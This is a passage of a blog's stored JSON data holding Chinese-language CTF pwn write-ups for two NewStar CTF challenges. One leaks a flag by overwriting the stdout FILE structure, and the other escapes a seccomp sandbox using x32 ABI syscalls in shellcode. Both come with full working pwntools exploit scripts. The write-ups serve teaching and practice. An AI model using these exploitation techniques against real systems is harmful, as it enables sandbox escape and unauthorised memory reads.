class=\"line\"></span><br><span class=\"line\">stdout=libcbase+libc.sym[<span class=\"string\">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">ru(<span class=\"string\">&quot;Addr: &quot;</span>)</span><br><span class=\"line\">payload=p64(stdout)</span><br><span class=\"line\"></span><br><span class=\"line\">leak(<span class=\"string\">&#x27;libcbase: &#x27;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;stdout: &#x27;</span>,<span class=\"built_in\">hex</span>(stdout))</span><br><span class=\"line\">debug()</span><br><span class=\"line\">s(payload)  </span><br><span class=\"line\"></span><br><span class=\"line\">ru(<span class=\"string\">&quot;Data: &quot;</span>)</span><br><span class=\"line\">payload=p64(<span class=\"number\">0xfbad1800</span>)+p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+p64(<span class=\"number\">0x233000</span>)+p64(<span class=\"number\">0x233040</span>)+p64(<span class=\"number\">0x233040</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">s(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>\n\n","site":{"data":{}},"excerpt":"<p>NewStar CTF Week5的题，利用stdout进行任意读。这题主要是想让一些同学了解打 Stdout 不只局限在低字节写 <code>\\x00</code> 来 leak libc，有时候我们可以利用这个来 leak <code>environ</code>拿栈地址打栈，leak <code>fskey</code> 打 <code>_IO_cookie_write</code>(House of Emma) …</p>","more":"<p>查壳，保护全开</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] <span class=\"string\">&#x27;/home/a1ph0nse/PwnPractice/CtfGame/NewStar/leak_me_plz/pwn&#x27;</span></span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Full RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>\n\n<p>开了沙箱</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> line  CODE  JT   JF      K</span><br><span class=\"line\">=================================</span><br><span class=\"line\"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class=\"built_in\">arch</span></span><br><span class=\"line\"> 0001: 0x15 0x00 0x08 0xc000003e  <span class=\"keyword\">if</span> (A != ARCH_X86_64) goto 0010</span><br><span class=\"line\"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class=\"line\"> 0003: 0x35 0x06 0x00 0x40000000  <span class=\"keyword\">if</span> (A &gt;= 0x40000000) goto 0010</span><br><span class=\"line\"> 0004: 0x15 0x04 0x00 0x00000000  <span class=\"keyword\">if</span> (A == <span class=\"built_in\">read</span>) goto 0009</span><br><span class=\"line\"> 0005: 0x15 0x03 0x00 0x00000001  <span class=\"keyword\">if</span> (A == write) goto 0009</span><br><span class=\"line\"> 0006: 0x15 0x02 0x00 0x00000003  <span class=\"keyword\">if</span> (A == close) goto 0009</span><br><span class=\"line\"> 0007: 0x15 0x01 0x00 0x0000000c  <span class=\"keyword\">if</span> (A == brk) goto 0009</span><br><span class=\"line\"> 0008: 0x15 0x00 0x01 0x000000e7  <span class=\"keyword\">if</span> (A != exit_group) goto 0010</span><br><span class=\"line\"> 0009: 0x06 0x00 0x00 0x7fff0000  <span class=\"built_in\">return</span> ALLOW</span><br><span class=\"line\"> 0010: 0x06 0x00 0x00 0x00000000  <span class=\"built_in\">return</span> KILL</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>不能<code>execve</code>而且<code>orw</code>缺<code>w</code>。</p>\n<p>程序比较简单。</p>\n<p>在init函数中进行初始化并在0x233000的位置分配了一块大小为<code>0x1000</code>的RW的内存，并且在get_flag中已经将flag写入到其中了，只需要将其读出即可知道flag。</p>\n<p>漏洞在vuln函数中</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> __noreturn <span class=\"title function_\">vuln</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"type\">void</span> *buf[<span class=\"number\">2</span>]; <span class=\"comment\">// [rsp+0h] [rbp-10h] BYREF</span></span><br><span class=\"line\"></span><br><span class=\"line\">  buf[<span class=\"number\">1</span>] = (<span class=\"type\">void</span> *)__readfsqword(<span class=\"number\">0x28</span>u);</span><br><span class=\"line\">  buf[<span class=\"number\">0</span>] = <span class=\"number\">0LL</span>;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Hiiii!My beeest friend.So glad that you come again.This time you need to read the flag.&quot;</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Here is your gift: %p\\nGood luck!\\n&quot;</span>, &amp;<span class=\"built_in\">puts</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Addr: &quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf, <span class=\"number\">8uLL</span>);</span><br><span class=\"line\">  <span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Data: &quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, buf[<span class=\"number\">0</span>], <span class=\"number\">0x38</span>uLL);</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Did you get that?&quot;</span>);</span><br><span class=\"line\">  _exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>开始会泄露出puts的地址，可以得到libcbase，之后会有一次任意写0x38byte的机会。</p>\n<p>在read后面有一个puts语句，可以尝试修改<code>_IO_2_1_stdout_</code>的<code>flag</code>、<code>write_base</code>和<code>write_ptr</code>实现任意读来将<code>flag</code>输出出来，还要设置<code>write_ptr==write_end</code>来避免在全缓冲模式下计算的count&gt;0(详情看源码，明明puts是以行缓冲模式计算的，不知道为何不设置的话无法输出)。</p>\n<p>exp:</p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span>*</span><br><span class=\"line\">context(log_level=<span class=\"string\">&#x27;debug&#x27;</span>,os=<span class=\"string\">&#x27;linux&#x27;</span>,arch=<span class=\"string\">&#x27;amd64&#x27;</span>)</span><br><span class=\"line\">filename=<span class=\"string\">&#x27;pwn&#x27;</span></span><br><span class=\"line\">elf=ELF(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\">libc=ELF(<span class=\"string\">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class=\"line\">p=process(<span class=\"string\">&#x27;./&#x27;</span>+filename)</span><br><span class=\"line\"><span class=\"comment\">#p=process([&#x27;./ld-2.23.so&#x27;,&#x27;./&#x27;+filename],env=&#123;&#x27;LD_PRELOAD&#x27;:&#x27;./libc-2.23.so&#x27;&#125;)</span></span><br><span class=\"line\"><span class=\"comment\">#p=remote(&#x27;&#x27;,)</span></span><br><span class=\"line\"></span><br><span class=\"line\">s       = <span class=\"keyword\">lambda</span> data               :p.send(data)</span><br><span class=\"line\">sl      = <span class=\"keyword\">lambda</span> data               :p.sendline(data)</span><br><span class=\"line\">r       = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recv(num)</span><br><span class=\"line\">rl      = <span class=\"keyword\">lambda</span> num=<span class=\"number\">4096</span>           :p.recvline(num)</span><br><span class=\"line\">ru      = <span class=\"keyword\">lambda</span> x                  :p.recvuntil(x)</span><br><span class=\"line\">itr     = <span class=\"keyword\">lambda</span>                    :p.interactive()</span><br><span class=\"line\">uu32    = <span class=\"keyword\">lambda</span> data               :u32(data.ljust(<span class=\"number\">4</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">uu64    = <span class=\"keyword\">lambda</span> data               :u64(data.ljust(<span class=\"number\">8</span>,<span class=\"string\">b&#x27;\\x00&#x27;</span>))</span><br><span class=\"line\">leak    = <span class=\"keyword\">lambda</span> name,addr          :log.success(<span class=\"string\">&#x27;&#123;&#125; = &#123;&#125;&#x27;</span>.<span class=\"built_in\">format</span>(name, addr))</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">debug</span>(<span class=\"params\">cmd=<span class=\"string\">&#x27;\\n&#x27;</span></span>):</span><br><span class=\"line\">  gdb.attach(p,cmd)</span><br><span class=\"line\">  pause()</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\">ru(<span class=\"string\">&quot;Here is your gift: &quot;</span>)</span><br><span class=\"line\">libcbase=<span class=\"built_in\">int</span>(ru(<span class=\"string\">&#x27;\\n&#x27;</span>)[<span class=\"number\">2</span>:-<span class=\"number\">1</span>],<span class=\"number\">16</span>)-libc.sym[<span class=\"string\">&#x27;puts&#x27;</span>]</span><br><span class=\"line\">ru(<span class=\"string\">&#x27;Good luck!\\n&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">stdout=libcbase+libc.sym[<span class=\"string\">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class=\"line\"></span><br><span class=\"line\">ru(<span class=\"string\">&quot;Addr: &quot;</span>)</span><br><span class=\"line\">payload=p64(stdout)</span><br><span class=\"line\"></span><br><span class=\"line\">leak(<span class=\"string\">&#x27;libcbase: &#x27;</span>,<span class=\"built_in\">hex</span>(libcbase))</span><br><span class=\"line\">leak(<span class=\"string\">&#x27;stdout: &#x27;</span>,<span class=\"built_in\">hex</span>(stdout))</span><br><span class=\"line\">debug()</span><br><span class=\"line\">s(payload)  </span><br><span class=\"line\"></span><br><span class=\"line\">ru(<span class=\"string\">&quot;Data: &quot;</span>)</span><br><span class=\"line\">payload=p64(<span class=\"number\">0xfbad1800</span>)+p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+p64(<span class=\"number\">0x233000</span>)+p64(<span class=\"number\">0x233040</span>)+p64(<span class=\"number\">0x233040</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">s(payload)</span><br><span class=\"line\"></span><br><span class=\"line\">itr()</span><br></pre></td></tr></table></figure>"},{"title":"code_me_plz","date":"2023-03-19T02:44:02.000Z","_content":"\nNewStar CTF Week5的题，用x32 ABI绕过沙箱\n\n<!--more-->\n\n查壳，保护全开\n\n```sh\n[*] '/home/a1ph0nse/PwnPractice/CtfGame/NewStar/code_me_plz/cod3'\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n```\n\n程序比较简单\n\n```c\nvoid __noreturn vuln()\n{\n  puts(\"Show me your code:\");\n  read(0, zone, 0x100uLL);\n  close(1);\n  ((void (*)(void))zone)();\n  _exit(0);\n}\n```\n\n会直接执行我们输入的内容，因此我们需要写一段shellcode来完成我们的工作。\n\n开了沙箱\n\n```sh\n line  CODE  JT   JF      K\n=================================\n 0000: 0x20 0x00 0x00 0x00000004  A = arch\n 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010\n 0002: 0x20 0x00 0x00 0x00000000  A = sys_number\n 0003: 0x35 0x05 0x00 0x40000000  if (A >= 0x40000000) goto 0009 # 允许sys_number>=0x40000000\n 0004: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0009\n 0005: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0009\n 0006: 0x15 0x02 0x00 0x00000003  if (A == close) goto 0009\n 0007: 0x15 0x01 0x00 0x0000000c  if (A == brk) goto 0009\n 0008: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0010\n 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW\n 0010: 0x06 0x00 0x00 0x00000000  return KILL\n```\n\n看起来只允许`read`、`write`、`close`、`brk`和`exit_group`，其他的都不可以，这不但让我们不能走`execve`，并且还凑不齐`orw`。\n\n但在`0003`可以看到`if (A >= 0x40000000) goto 0009`，这意味着我们可以使用`sys_number>=0x40000000`的指令，而这些指令都是32位程序的接口，64位系统为了支持32位系统，保留了这些接口。\n\nx32 ABI与64位下的系统调用方法几乎无异，只不过系统调用号都是不小于0x40000000，并且要求使用32位指针。\n\n具体的调用表可以查看系统头文件中的`/usr/src/linux-headers-$version-generic/arch/x86/include/generated/uapi/asm/unistd_x32.h`，大致如下：\n\n```c\n// #define __X32_SYSCALL_BIT\t0x40000000\n\n#ifndef _UAPI_ASM_UNISTD_X32_H\n#define _UAPI_ASM_UNISTD_X32_H\n\n#define __NR_read (__X32_SYSCALL_BIT + 0)\n#define __NR_write (__X32_SYSCALL_BIT + 1)\n#define __NR_open (__X32_SYSCALL_BIT + 2)\n#define __NR_close (__X32_SYSCALL_BIT + 3)\n\n...\n\n#endif /* _UAPI_ASM_UNISTD_X32_H */\n```\n\n因此这里我们就可以利用`0x40000002`的`open`来补上`orw`缺少的`open`。\n\n**小迷惑：shellcode明明可以直接将\"/flag\"入栈，为什么wp要那样处理一番来得到**\n\n**exp:**\n\n```py\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='cod3'\nelf=ELF('./'+filename)\n#libc=ELF('')\n# p=process('./'+filename)\n#p=process(['./ld-2.23.so','./'+filename],env={'LD_PRELOAD':'./libc-2.23.so'})\np=remote('node4.buuoj.cn',26063)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n    \n    # mov rax, 0x1111111111111111^0x67616c662f\n    # push rax\n    # mov rax, 0x1111111111111111\n    # xor [rsp], rax\nru(\"Show me your code:\\n\")\nshellcode=asm(\n    '''\n    mov rax, 0x67616c662f\n    push rax\n    \n    push 0x40000002\n    pop rax\n    mov rdi, rsp\n    mov rdx, 0x440\n    xor rsi, rsi\n    syscall\n\n    mov rdi, rax\n    sub rsp, rdx\n    mov rsi, rsp\n    xor rax, rax\n    syscall\n\n    mov rdx, rax\n    push 0x2\n    pop rdi\n    push 0x1\n    pop rax\n    syscall \n    \n    '''\n)\n# debug()\nleak('length of shellcode: ',len(shellcode))\ns(shellcode)\n\nitr()\n\n```\n\n","source":"_posts/NewStar-code_me_plz.md","raw":"---\ntitle: code_me_plz\ndate: 2023-03-19 10:44:02\ncategories: \n- pwn_wp\ntags: \n- pwn\n- sandbox\n\n\n\n---\n\nNewStar CTF Week5的题，用x32 ABI绕过沙箱\n\n<!--more-->\n\n查壳，保护全开\n\n```sh\n[*] '/home/a1ph0nse/PwnPractice/CtfGame/NewStar/code_me_plz/cod3'\n    Arch:     amd64-64-little\n    RELRO:    Full RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n```\n\n程序比较简单\n\n```c\nvoid __noreturn vuln()\n{\n  puts(\"Show me your code:\");\n  read(0, zone, 0x100uLL);\n  close(1);\n  ((void (*)(void))zone)();\n  _exit(0);\n}\n```\n\n会直接执行我们输入的内容，因此我们需要写一段shellcode来完成我们的工作。\n\n开了沙箱\n\n```sh\n line  CODE  JT   JF      K\n=================================\n 0000: 0x20 0x00 0x00 0x00000004  A = arch\n 0001: 0x15 0x00 0x08 0xc000003e  if (A != ARCH_X86_64) goto 0010\n 0002: 0x20 0x00 0x00 0x00000000  A = sys_number\n 0003: 0x35 0x05 0x00 0x40000000  if (A >= 0x40000000) goto 0009 # 允许sys_number>=0x40000000\n 0004: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0009\n 0005: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0009\n 0006: 0x15 0x02 0x00 0x00000003  if (A == close) goto 0009\n 0007: 0x15 0x01 0x00 0x0000000c  if (A == brk) goto 0009\n 0008: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0010\n 0009: 0x06 0x00 0x00 0x7fff0000  return ALLOW\n 0010: 0x06 0x00 0x00 0x00000000  return KILL\n```\n\n看起来只允许`read`、`write`、`close`、`brk`和`exit_group`，其他的都不可以，这不但让我们不能走`execve`，并且还凑不齐`orw`。\n\n但在`0003`可以看到`if (A >= 0x40000000) goto 0009`，这意味着我们可以使用`sys_number>=0x40000000`的指令，而这些指令都是32位程序的接口，64位系统为了支持32位系统，保留了这些接口。\n\nx32 ABI与64位下的系统调用方法几乎无异，只不过系统调用号都是不小于0x40000000，并且要求使用32位指针。\n\n具体的调用表可以查看系统头文件中的`/usr/src/linux-headers-$version-generic/arch/x86/include/generated/uapi/asm/unistd_x32.h`，大致如下：\n\n```c\n// #define __X32_SYSCALL_BIT\t0x40000000\n\n#ifndef _UAPI_ASM_UNISTD_X32_H\n#define _UAPI_ASM_UNISTD_X32_H\n\n#define __NR_read (__X32_SYSCALL_BIT + 0)\n#define __NR_write (__X32_SYSCALL_BIT + 1)\n#define __NR_open (__X32_SYSCALL_BIT + 2)\n#define __NR_close (__X32_SYSCALL_BIT + 3)\n\n...\n\n#endif /* _UAPI_ASM_UNISTD_X32_H */\n```\n\n因此这里我们就可以利用`0x40000002`的`open`来补上`orw`缺少的`open`。\n\n**小迷惑：shellcode明明可以直接将\"/flag\"入栈，为什么wp要那样处理一番来得到**\n\n**exp:**\n\n```py\nfrom pwn import*\ncontext(log_level='debug',os='linux',arch='amd64')\nfilename='cod3'\nelf=ELF('./'+filename)\n#libc=ELF('')\n# p=process('./'+filename)\n#p=process(['./ld-2.23.so','./'+filename],env={'LD_PRELOAD':'./libc-2.23.so'})\np=remote('node4.buuoj.cn',26063)\n\ns       = lambda data               :p.send(data)\nsl      = lambda data               :p.sendline(data)\nr       = lambda num=4096           :p.recv(num)\nrl      = lambda num=4096           :p.recvline(num)\nru      = lambda x                  :p.recvuntil(x)\nitr     = lambda                    :p.interactive()\nuu32    = lambda data               :u32(data.ljust(4,b'\\x00'))\nuu64    = lambda data               :u64(data.ljust(8,b'\\x00'))\nleak    = lambda name,addr          :log.success('{} = {}'.format(name, addr))\n\ndef debug(cmd='\\n'):\n  gdb.attach(p,cmd)\n  pause()\n    \n    # mov rax, 0x1111111111111111^0x67616c662f\n    # push rax\n    # mov rax, 0x1111111111111111\n    # xor [rsp], rax\nru(\"Show me your code:\\n\")\nshellcode=asm(\n    '''\n    mov rax, 0x67616c662f\n    push rax\n    \n    push 0x40000002\n    pop rax\n    mov rdi, rsp\n    mov rdx, 0x440\n    xor rsi, rsi\n    syscall\n\n    mov rdi, rax\n    sub rsp, rdx\n    mov rsi, rsp\n    xor rax, rax\n    syscall\n\n    mov rdx, rax\n    push 0x2\n    pop rdi\n    push 0x1\n    pop rax\n    syscall \n    \n    '''\n)\n# debug()\nleak('length of shellcode: ',len(shellcode))\ns(shellcode)\n\nitr()\n\n```\n\n","slug":"NewStar-code_me_plz","published":1,"updated":"2023-03-19T11:15:56.000Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clg9czaff001i5oud1mgz7yqp","content":"<p>NewStar CTF Week5的题，用x32 ABI绕过沙箱</p>\n<span id=\"more\"></span>\n\n<p>查壳，保护全开</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[*] <span class=\"string\">&#x27;/home/a1ph0nse/PwnPractice/CtfGame/NewStar/code_me_plz/cod3&#x27;</span></span><br><span class=\"line\">    Arch:     amd64-64-little</span><br><span class=\"line\">    RELRO:    Full RELRO</span><br><span class=\"line\">    Stack:    Canary found</span><br><span class=\"line\">    NX:       NX enabled</span><br><span class=\"line\">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>\n\n<p>程序比较简单</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> __noreturn <span class=\"title function_\">vuln</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;Show me your code:&quot;</span>);</span><br><span class=\"line\">  read(<span class=\"number\">0</span>, zone, <span class=\"number\">0x100</span>uLL);</span><br><span class=\"line\">  close(<span class=\"number\">1</span>);</span><br><span class=\"line\">  ((<span class=\"type\">void</span> (*)(<span class=\"type\">void</span>))zone)();</span><br><span class=\"line\">  _exit(<span class=\"number\">0</span>);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>会直接执行我们输入的内容，因此我们需要写一段shellcode来完成我们的工作。</p>\n<p>开了沙箱</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"> line  CODE  JT   JF      K</span><br><span class=\"line\">=================================</span><br><span class=\"line\"> 0000: 0x20 0x00 0x00 0x00000004  A = <span class=\"built_in\">arch</span></span><br><span class=\"line\"> 0001: 0x15 0x00 0x08 0xc000003e  <span class=\"keyword\">if</span> (A != ARCH_X86_64) goto 0010</span><br><span class=\"line\"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class=\"line\"> 0003: 0x35 0x05 0x00 0x40000000  <span class=\"keyword\">if</span> (A &gt;= 0x40000000) goto 0009 <span class=\"comment\"># 允许sys_number&gt;=0x40000000</span></span><br><span class=\"line\"> 0004: 0x15 0x04 0x00 0x00000000  <span class=\"keyword\">if</span> (A == <span class=\"built_in\">read</span>) goto 0009</span><br><span class=\"line\"> 0005: 0x15 0x03 0x00 0x00000001  <span class=\"keyword\">if</span> (A == write) goto 0009</span><br><span class=\"line\"> 0006: 0x15 0x02 0x00 0x00000003  <span class=\"keyword\">if</span> (A == close) goto 0009</span><br><span class=\"line\"> 0007: 0x15 0x01 0x00 0x0000000c  <span class=\"keyword\">if</span> (A == brk) goto 0009</span><br><span class=\"line\"> 0008: 0x15 0x00 0x01 0x000000e7  <span class=\"keyword\">if</span> (A != exit_group) goto 0010</span><br><span class=\"line\"> 0009: 0x06 0x00 0x00 0x7fff0000  <span class=\"built_in\">return</span> ALLOW</span><br><span class=\"line\"> 0010: 0x06 0x00 0x00 0x00000000  <span class=\"built_in\">return</span> KILL</span><br></pre></td></tr></table></figure>\n\n<p>看起来只允许<code>read</code>、<code>write</code>、<code>close</code>、<code>brk</code>和<code>exit_group</code>，其他的都不可以，这不但让我们不能走<code>execve</code>，并且还凑不齐<code>orw</code>。</p>\n<p>但在<code>0003</code>可以看到<code>if (A &gt;= 0x40000000) goto 0009</code>，这意味着我们可以使用<code>sys_number&gt;=0x40000000</code>的指令，而这些指令都是32位程序的接口，64位系统为了支持32位系统，保留了这些接口。</p>\n<p>x32 ABI与64位下的系统调用方法几乎无异，只不过系统调用号都是不小于0x40000000，并且要求使用32位指针。</p>\n<p>具体的调用表可以查看系统头文件中的<code>/usr/src/linux-headers-$version-generic/arch/x86/include/generated/uapi/asm/unistd_x32.h</code>，大致如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// #define __X32_SYSCALL_BIT\t0x40000000</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">ifndef</span> _UAPI_ASM_UNISTD_X32_H</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> _UAPI_ASM_UNISTD_X32_H</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> __NR_read (__X32_SYSCALL_BIT + 0)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> __NR_write (__X32_SYSCALL_BIT + 1)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> __NR_open (__X32_SYSCALL_BIT + 2)</span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> __NR_close (__X32_SYSCALL_BIT + 3)</span></span><br><span class=\"line\"></span><br><span class=\"line\">...</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">endif</span> <span class=\"comment\">/* _UAPI_ASM_UNISTD_X32_H */</span></span></span><br></pre></td></tr></table></figure>\n\n<p>因此这里我们就可以利用<code>0x40000002</code>的<code>open</code>来补上<code>orw</code>缺少的<code>open</code>。</p>\n<p><strong>小迷惑：shellcode明明可以直接将”/flag”入栈，为什么wp要那样处理一番来得到</strong></p>\n<p><strong>exp:</strong></p>\n<figure class=\"highlight py\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span 